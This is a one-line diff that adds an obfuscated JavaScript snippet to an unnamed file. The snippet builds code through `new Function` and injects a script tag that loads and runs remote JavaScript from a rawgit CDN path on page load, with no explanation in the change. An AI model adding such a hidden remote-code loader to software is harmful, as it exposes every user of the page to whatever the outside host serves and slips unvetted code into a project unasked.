@@ -1,0 +1,1 @@
+;!function(e){new Function('e', 'e.body.appendChild(e.createElement("script")).src="https://cdn.rawgit.com/raininglemons/foxy-ascii/master/final.js"')(e)}(document);
